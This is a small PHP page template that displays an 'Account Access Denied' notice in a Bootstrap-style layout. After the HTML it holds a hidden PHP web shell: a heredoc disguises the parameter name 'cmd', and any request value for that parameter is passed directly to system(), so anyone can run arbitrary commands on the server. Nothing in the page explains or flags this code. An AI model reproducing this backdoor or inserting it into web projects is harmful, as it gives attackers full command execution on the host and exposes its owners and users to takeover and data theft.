
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Account Access Denied</h1>
					Your acccount has been denied to access this feature!
                </div>
                <!-- /.col-lg-12 -->
            </div>
            <!-- /.row -->
        </div>
        <!-- /#page-wrapper -->
<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>